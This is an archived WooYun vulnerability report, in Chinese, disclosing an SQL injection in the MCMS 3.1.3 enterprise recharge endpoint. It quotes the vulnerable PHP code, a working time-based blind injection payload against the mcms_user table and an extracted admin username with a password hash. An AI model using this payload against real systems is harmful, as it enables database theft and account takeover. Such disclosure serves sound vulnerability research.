{"id": 33776, "wybug_id": "wooyun-2015-0108017", "wybug_title": "mcms最新版SQL注入一枚", "wybug_corp": "mcms.cc", "wybug_author": "路人甲", "wybug_date": "2015-04-20 19:17", "wybug_open_date": "2015-07-24 19:19", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-25：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-06-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-24：\t细节向公众公开  简要描述： mcms最新版SQL注入一枚 详细说明：  掌易科技的程序员反应相当快啊，确认漏洞当天就修复以后出新版本了，前面在wooyun提的几个漏洞新版的mcms做了相应的处理，发布了新版v_3.1.3.enterprise，再来研究研究。注入一枚：/app/public/user.php?m=recharge&ajax=1   POST中有个参数params存在注入。\nfunction m__recharge(){\t    global $dbm;    check_level('C0503',AJAX);    $fields = array();    $_POST['params']=isset($_POST['params'])?trim($_POST['params']):'';     $_POST['params']=explode(',',$_POST['params']);    $_POST['point'] = isset($_POST['point'])?intval($_POST['point']):0;    if(count($_POST['params'])==0) die('{\"code\":\"1\",\"msg\":\"请选择会员\",\"id\":\"user\"}');    if($_POST['point']==0) die('{\"code\":\"2\",\"msg\":\"请输入积分数\",\"id\":\"point\"}');    foreach($_POST['params'] as $v){    \t        $fields = array('uid'=>$v,'point'=>$_POST['point'],'create_time'=>time(),'point_type'=>4);        $ret = $dbm->single_insert(TB_PRE.\"point\",$fields);    }    die('{\"code\":\"0\",\"msg\":\"充值成功\"}');}\n因为没有经过sqlxss()的处理，因此，这里是存在注入的。但是这里有个问题是，不能使用逗号，那就这样吧Payload:GET提交\npoint=1&params=3' and  (  select  case  when  (  select  login_name from  (  select  *  from  mcms_user)  as  a  where  uid=1)  like  'a%'  then  sleep(1)  else  sleep(0)  end)  or '\n因为是time-based blind 注入，猜测管理员用户名的第一个字母时，若错误，不延迟，如下图\n\n若正确，延迟，如下图\n\n按上面的方法依次做下去（burp intruder或者自己写个脚本跑），可测试管理员用户名为：mcmsadmin，密码为： f6fdffe48c908deb0f4c3bd36c032e72   漏洞证明：  见 详细说明   修复方案：  sqlxss()   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-07-24 19:19 厂商回复：  漏洞Rank：8  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}